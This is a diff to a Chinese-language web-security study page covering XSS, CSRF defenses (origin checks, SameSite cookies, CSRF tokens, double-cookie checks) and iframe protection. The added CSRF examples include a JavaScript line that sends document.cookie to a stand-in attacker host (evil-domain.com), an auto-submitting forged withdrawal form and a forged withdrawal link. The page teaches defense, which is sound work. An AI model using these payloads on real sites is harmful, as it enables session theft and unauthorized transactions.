@@ -4,7 +4,7 @@ group:
   title: 网络请求与远程资源
 ---
 
-## XSS
+## XSS:跨站脚本攻击
 
 XSS(跨站脚本攻击)就是攻击者想尽一切办法将可以执行的代码注入到网页中。
 
@@ -77,34 +77,88 @@ DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属�
 攻击类型
 
 1. GET 型：如在页面的某个 img 中发起一个 get 请求
+
+   ```js
+   new Image().src =
+     'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie;
+   ```
+
 2. POST 型：通过自动提交表单到恶意网站
+
+   ```html
+   <form action="http://bank.example/withdraw" method="POST">
+     <input type="hidden" name="account" value="xiaoming" />
+     <input type="hidden" name="amount" value="10000" />
+     <input type="hidden" name="for" value="hacker" />
+   </form>
+   <script>
+     document.forms[0].submit();
+   </script>
+   ```
+
 3. 链接型：需要诱导用户点击链接
+   ```html
+   <a
+     href="http://test.com/csrf/withdraw.php?amount=1000&for=hacker"
+     taget="_blank"
+   >
+     重磅消息！！
+   </a>
+   ```
 
 预防方案：
 
 CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对 CSRF 的防护能力来提升安全性。
 
-1. 同源检测：通过 `Header` 中的 `Origin Header` 、`Referer Header` 确定，但不同浏览器可能会有不一样的实现，不能完全保证
-2. CSRF Token 校验：将 CSRF Token 输出到页面中（通常保存在 Session 中），页面提交的请求携带这个 Token，服务器验证 Token 是否
-   正确
-3. 双重 cookie 验证：
+阻止不明外域的访问
 
-   - 流程：
-     - 步骤 1：在用户访问网站页面时，向请求域名注入一个 `Cookie`，内容为随机字符串（例如 csrfcookie=v8g9e4ksfhw）
-     - 步骤 2：在前端向后端发起请求时，取出 `Cookie`，并添加到 `URL` 的参数中（接上例 POST `https://www.a.com/comment?csrfcookie=v8g9e4ksfhw`）
-     - 步骤 3：后端接口验证 `Cookie` 中的字段与 `URL` 参数中的字段是否一致，不一致则拒绝。
-   - 优点：
-     - 无需使用 Session，适用面更广，易于实施。
-     - Token 储存于客户端中，不会给服务器带来压力。
-     - 相对于 Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。
-   - 缺点：
+- 同源检测
+- Samesite Cookie
 
-     - Cookie 中增加了额外的字段。
-     - 如果有其他漏洞（例如 XSS），攻击者可以注入 Cookie，那么该防御方式失效。
-     - 难以做到子域名的隔离。
-     - 为了确保 Cookie 传输安全，采用这种防御方式的最好确保用整站 HTTPS 的方式，如果还没切 HTTPS 的使用这种方式也会有风险。
+提交时要求附加本域才能获取的信息
 
-4. Samesite Cookie 属性：Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie，Samesite 有两个属性值，Strict 为任何情况下都不可以作为第三方 Cookie ，Lax 为可以作为第三方 Cookie , 但必须是 Get 请求
+- CSRF Token
+- 双重 Cookie 验证
+
+### 同源检测
+
+通过 `Header` 中的 `Origin Header` 、`Referer Header` 确定，但不同浏览器可能会有不一样的实现，不能完全保证
+
+### Samesite Cookie
+
+Google 起草了一份草案来改进 HTTP 协议，那就是为 Set-Cookie 响应头新增 Samesite 属性，它用来标明这个 Cookie 是个“同站 Cookie”，同站 Cookie 只能作为第一方 Cookie，不能作为第三方 Cookie
+
+Samesite 有两个属性值
+
+- `Strict`: 为任何情况下都不可以作为第三方 Cookie
+- `Lax`: 为可以作为第三方 Cookie , 但必须是 Get 请求
+
+在敏感 cookie 上携带属性 Samesite：Strict 或 Lax，可以避免在第三方不同域网站上携带 cookie
+
+### CSRF Token
+
+首先服务器生成一个动态的 token，传给用户，用户再次提交或者请求敏感操作时，携带此 token，服务端校验通过才返回正确结果。
+
+### 双重 cookie
+
+流程
+
+- 步骤 1：在用户访问网站页面时，向请求域名注入一个 `Cookie`，内容为随机字符串（例如 csrfcookie=v8g9e4ksfhw）
+- 步骤 2：在前端向后端发起请求时，取出 `Cookie`，并添加到 `URL` 的参数中（接上例 POST `https://www.a.com/comment?csrfcookie=v8g9e4ksfhw`）
+- 步骤 3：后端接口验证 `Cookie` 中的字段与 `URL` 参数中的字段是否一致，不一致则拒绝。
+
+优点
+
+- 无需使用 Session，适用面更广，易于实施。
+- Token 储存于客户端中，不会给服务器带来压力。
+- 相对于 Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。
+
+缺点
+
+- Cookie 中增加了额外的字段。
+- 如果有其他漏洞（例如 XSS），攻击者可以注入 Cookie，那么该防御方式失效。
+- 难以做到子域名的隔离。
+- 为了确保 Cookie 传输安全，采用这种防御方式的最好确保用整站 HTTPS 的方式，如果还没切 HTTPS 的使用这种方式也会有风险。
 
 ## iframe 安全
 
@@ -118,20 +172,14 @@ CSRF 通常从第三方网站发起，被攻击的网站无法防止攻击发生
 
 1. 为 iframe 设置 sandbox 属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限“原则
 2. 服务端设置 `X-Frame-Options Header` 头，拒绝页面被嵌套，X-Frame-Options 是 HTTP 响应头中用来告诉浏览器一个页面是否可以嵌入 `<iframe>` 中
-   - eg.X-Frame-Options: SAMEORIGIN
-   - SAMEORIGIN: iframe 页面的地址只能为同源域名下的页面
-   - ALLOW-FROM: 可以嵌套在指定来源的 iframe 里
-   - DENY: 当前页面不能被嵌套在 iframe 里
+
+- eg.X-Frame-Options: SAMEORIGIN
+- SAMEORIGIN: iframe 页面的地址只能为同源域名下的页面
+- ALLOW-FROM: 可以嵌套在指定来源的 iframe 里
+- DENY: 当前页面不能被嵌套在 iframe 里
+
 3. 设置 CSP 即 `Content-Security-Policy` 请求头
 4. 减少对 iframe 的使用
-
-## 错误的内容推断
-
-说明：
-文件上传类型校验失败后，导致恶意的 JS 文件上传后，浏览器 `Content-Type Header`的默认解析为可执行的 JS 文件
-
-预防方案：
-设置`X-Content-Type-Options` 头
 
 ## 第三方依赖包
 
